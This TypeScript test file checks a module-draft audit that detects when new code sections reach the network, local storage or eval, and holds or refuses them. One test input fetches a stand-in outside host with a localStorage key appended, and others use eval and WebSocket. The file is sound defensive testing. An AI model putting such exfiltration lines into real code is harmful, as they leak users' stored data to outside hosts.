// module-drafts.audit.spec.ts — THE DRAFT AUDIT at the draft door: what a
// written section newly reaches is known before anything is written, a draft
// that reaches something new is held in the brood before its pick is made,
// and a hold that cannot be recorded means nothing is applied.

import { describe, expect, it } from 'vitest'
import { EffectBus, SignatureService } from '@hypercomb/core'
import { draftModule, type DraftAdmission, type ModuleDraftDeps } from './module-drafts'
import type { Picks } from './package-tree'
import type { ReplicationIo } from './replication-walker'

const encode = (text: string): Uint8Array<ArrayBuffer> => new TextEncoder().encode(text) as Uint8Array<ArrayBuffer>
const sigOf = async (bytes: Uint8Array<ArrayBuffer>): Promise<string> => SignatureService.sign(bytes.buffer)

const BEE = [
  'import { Drone } from "@hypercomb/core";',
  '// src/games/solomon/labyrinth.ts',
  'var rooms = "remembered";',
  '// src/games/solomon/solomon.drone.ts',
  'export var SolomonDrone = class extends Drone {};',
].join('\n')
const SECTION = 'src/games/solomon/labyrinth.ts'

const world = async (admit?: ModuleDraftDeps['admit']) => {
  const heap = new Map<string, Uint8Array<ArrayBuffer>>()
  const bees = new Map<string, Uint8Array>()
  const put = async (text: string): Promise<string> => { const bytes = encode(text); const sig = await sigOf(bytes); heap.set(sig, bytes); return sig }
  const beeSig = await sigOf(encode(BEE))
  bees.set(beeSig, encode(BEE))
  const solomon = await put(JSON.stringify({ name: 'solomon', cells: [], bees: [`${beeSig}.js`], dependencies: [] }))
  const games = await put(JSON.stringify({ name: 'games', cells: [solomon], bees: [], dependencies: [] }))
  const trunk = await put(JSON.stringify({ name: 'root', cells: [games], bees: [], dependencies: [] }))
  const io: ReplicationIo = { read: async sig => heap.get(sig) ?? null, fetch: async () => null, write: async (sig, bytes) => { heap.set(sig, bytes) } }
  let picks: Picks = {}
  /** Every act, in order: what the audit needs is that the hold comes first. */
  const acts: string[] = []
  const admitted: DraftAdmission[] = []
  const deps: ModuleDraftDeps = {
    trunk: () => trunk,
    store: () => ({
      getBeeBytes: async sig => bees.get(sig) ?? null,
      writeBeeBytes: async (sig, bytes) => { acts.push('write bee'); bees.set(sig, bytes) },
      writeLayerBytes: async (sig, bytes) => { acts.push('write layer'); heap.set(sig, new Uint8Array(bytes) as Uint8Array<ArrayBuffer>) },
    }),
    layers: async () => io,
    picks: () => picks,
    apply: async (_t, _admitted, next) => { acts.push('apply'); picks = next; return { ok: true } },
    now: () => 1_700_000_000_000,
    ...(admit ? { admit: async (draft: DraftAdmission) => { acts.push('admit'); admitted.push(draft); await admit(draft) } } : {}),
  }
  return { beeSig, deps, acts, admitted, picksNow: () => picks }
}

describe('the draft audit at the draft door', () => {
  it('records a draft that reaches nothing new, and applies it', async () => {
    const w = await world(async () => {})
    const outcome = await draftModule({ beeSig: w.beeSig, section: SECTION, body: 'var rooms = "fresh";' }, w.deps)
    expect(outcome).toMatchObject({ ok: true, reaches: [] })
    expect(w.admitted).toEqual([expect.objectContaining({ from: w.beeSig, section: SECTION, path: 'games/solomon', reaches: [] })])
    expect(w.acts[0]).toBe('admit')
  })

  it('holds a draft that newly reaches something BEFORE anything is written or made live', async () => {
    const w = await world(async () => {})
    const outcome = await draftModule({ beeSig: w.beeSig, section: SECTION, body: 'var rooms = await fetch("https://elsewhere.example/" + localStorage.key(0));' }, w.deps)
    expect(outcome).toMatchObject({ ok: true, reaches: ['network', 'storage'] })
    if (!outcome.ok) return
    expect(w.admitted[0]).toMatchObject({ sig: outcome.beeSig, reaches: ['network', 'storage'] })
    expect(w.acts).toEqual(['admit', 'write bee', 'write layer', 'write layer', 'apply'])
  })

  it('applies nothing when a hold cannot be recorded', async () => {
    const w = await world(async () => { throw new Error('the brood cannot be written') })
    const outcome = await draftModule({ beeSig: w.beeSig, section: SECTION, body: 'var rooms = eval(text);' }, w.deps)
    expect(outcome.ok).toBe(false)
    if (outcome.ok) return
    expect(outcome.error).toMatch(/newly reaches text run as code and could not be held/)
    expect(w.acts).toEqual(['admit'])
    expect(w.picksNow()).toEqual({})
  })

  it('refuses a reaching draft where nothing can hold it, and still applies a clean one', async () => {
    const bare = await world()
    const reaching = await draftModule({ beeSig: bare.beeSig, section: SECTION, body: 'var rooms = new WebSocket(url);' }, bare.deps)
    expect(reaching.ok).toBe(false)
    expect(bare.acts).toEqual([])
    const clean = await draftModule({ beeSig: bare.beeSig, section: SECTION, body: 'var rooms = "fresh";' }, bare.deps)
    expect(clean).toMatchObject({ ok: true, reaches: [] })
  })

  it('a clean draft is applied even when its record cannot be written', async () => {
    const w = await world(async () => { throw new Error('no storage') })
    expect(await draftModule({ beeSig: w.beeSig, section: SECTION, body: 'var rooms = "fresh";' }, w.deps)).toMatchObject({ ok: true })
  })

  it('announces the draft, so its reading can start', async () => {
    const w = await world(async () => {})
    const heard: unknown[] = []
    const off = EffectBus.on('module:drafted', draft => { heard.push(draft) })
    try {
      const outcome = await draftModule({ beeSig: w.beeSig, section: SECTION, body: 'var rooms = "fresh again";' }, w.deps)
      if (!outcome.ok) throw new Error(outcome.error)
      expect(heard.at(-1)).toMatchObject({ sig: outcome.beeSig, from: w.beeSig, section: SECTION, path: 'games/solomon', of: 'bee', reaches: [] })
    } finally { off() }
  })
})
